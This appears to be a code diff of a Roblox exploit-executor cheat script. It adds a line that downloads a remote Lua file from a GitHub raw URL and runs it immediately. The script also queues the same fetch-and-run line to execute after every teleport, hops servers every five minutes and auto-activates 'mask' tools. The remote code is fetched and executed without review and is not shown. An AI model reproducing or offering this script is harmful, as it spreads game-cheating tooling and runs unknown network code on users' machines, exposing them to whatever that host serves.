@@ -1,7 +1,12 @@
--- === Your Provided Script at the Top ===
+-- Define a function to execute your initial script
+local function runInitialScript()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/adammichaeljunior-arch/uhh/refs/heads/main/baddies.lua"))()
+end
 
--- === Main Script with Server Hop, Auto-Equip "mask", and CPU Saver ===
+-- Run it immediately
+coroutine.wrap(runInitialScript)()
 
+-- Rest of your code continues here
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
@@ -12,7 +17,6 @@ local player = Players.LocalPlayer
 local function queueScript()
     local SRC = [[
         loadstring(game:HttpGet("https://raw.githubusercontent.com/adammichaeljunior-arch/uhh/refs/heads/main/baddies.lua"))()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/mafuasahina/whatever/main/baddies"))()
     ]]
     if syn and syn.queue_on_teleport then
         syn.queue_on_teleport(SRC)
@@ -21,7 +25,7 @@ local function queueScript()
     end
 end
 
--- Extra CPU Saver
+-- CPU Saver
 if _G.CPUSaver then
     pcall(function()
         settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
@@ -32,14 +36,12 @@ if _G.CPUSaver then
         Lighting.FogEnd = 9e9
         Lighting.Ambient = Color3.new(0,0,0)
         Lighting.OutdoorAmbient = Color3.new(0,0,0)
-        -- Disable sounds
         for _, sound in pairs(workspace:GetDescendants()) do
             if sound:IsA("Sound") then
                 sound.Volume = 0
                 sound.Playing = false
             end
         end
-        -- Disable particles
         for _, v in pairs(workspace:GetDescendants()) do
             if v:IsA("ParticleEmitter") or v:IsA("Trail") then
                 v.Enabled = false
@@ -50,10 +52,9 @@ end
 
 local lastServerId = nil
 
--- Server hop after 5 minutes (300 seconds)
+-- Server hop after 5 minutes
 delay(300, function()
-    queueScript() -- Queue scripts for next teleport
-    -- Find a server to hop to
+    queueScript()
     local function getPublicServers()
         local servers = {}
         local cursor = ""
@@ -80,12 +81,10 @@ delay(300, function()
 
     local servers = getPublicServers()
     if #servers == 0 then
-        -- No servers found, just teleport to same place for refresh
         TeleportService:Teleport(game.PlaceId, player)
         return
     end
 
-    -- Filter servers
     local validServers = {}
     for _, server in ipairs(servers) do
         if server.playing < server.maxPlayers and server.id ~= game.JobId and server.id ~= lastServerId then
@@ -98,16 +97,14 @@ delay(300, function()
         return
     end
 
-    -- Pick a random server
     local target = validServers[math.random(1, #validServers)]
     lastServerId = target.id
     print("[ServerHop] Hop to server:", target.id)
     TeleportService:TeleportToPlaceInstance(game.PlaceId, target.id, player)
 end)
 
--- Auto-equip any tool with "mask" in its name upon spawn/join
-local function equipMaskTools()
-    -- Wait until character is loaded
+-- Auto-equip and activate tools with "mask" in their name
+local function equipAndUseMask()
     if not player.Character then
         player.CharacterAdded:Wait()
     end
@@ -115,23 +112,27 @@ local function equipMaskTools()
     local humanoid = character:FindFirstChildOfClass("Humanoid")
     if not humanoid then return end
 
-    -- Wait for backpack to load
     local backpack = player:WaitForChild("Backpack")
-    -- Wait a short moment for tools to load
     task.wait(1)
 
-    -- Find tools with "mask" in their name
     for _, tool in ipairs(backpack:GetChildren()) do
         if tool:IsA("Tool") and string.find(string.lower(tool.Name), "mask") then
             humanoid:EquipTool(tool)
-            print("Equipped tool with 'mask':", tool.Name)
-            break -- Optional: stop after first match
+            print("Equipped mask tool:", tool.Name)
+            -- Activate the tool (simulate click)
+            if typeof(tool) == "Instance" and typeof(tool.Activate) == "function" then
+                task.wait(0.1)
+                pcall(function()
+                    tool:Activate()
+                end)
+                print("Activated mask tool:", tool.Name)
+            end
+            break
         end
     end
 end
 
--- Run the equip function on spawn/join
-player.CharacterAdded:Connect(equipMaskTools)
+player.CharacterAdded:Connect(equipAndUseMask)
 if player.Character then
-    equipMaskTools()
+    equipAndUseMask()
 end
